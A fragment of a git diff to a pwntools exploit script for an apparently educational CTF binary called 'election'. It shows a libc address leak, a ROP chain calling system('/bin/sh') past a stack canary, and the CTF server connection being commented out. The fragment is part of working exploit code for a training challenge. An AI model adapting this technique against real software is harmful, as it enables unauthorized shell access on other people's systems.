@@ -5,7 +5,7 @@ context.arch = 'amd64'
 r = process('./election', env={"LD_PRELOAD": "./libc.so"})
 
 # nc edu-ctf.csie.org 10180
-r = remote('edu-ctf.csie.org', 10180)
+# r = remote('edu-ctf.csie.org', 10180)
 pause()
 
 ############################### round 1 -----------------------> leak addresses
@@ -131,7 +131,7 @@ libc_base = stack_chk_fail_libc - 0x134c80
 ################################ round 2 ------------> system('/bin/sh')
 libc_system = libc_base + 0x4f440
 libc = ELF('./libc.so')
-bin_sh = base + next(libc.search('/bin/sh'))
+bin_sh = libc_base + libc.search('/bin/sh').next()
 
 rop2 = flat(p64(buf + 32),
             p64(0xdeadbeef),
@@ -188,6 +188,7 @@ payload = flat('b' * offset_from_msg_to_canary,
                )
 
 r.sendlineafter('Message: ', payload) # to pusheen
+r.sendlineafter('>', '3')
 r.interactive()
 
 
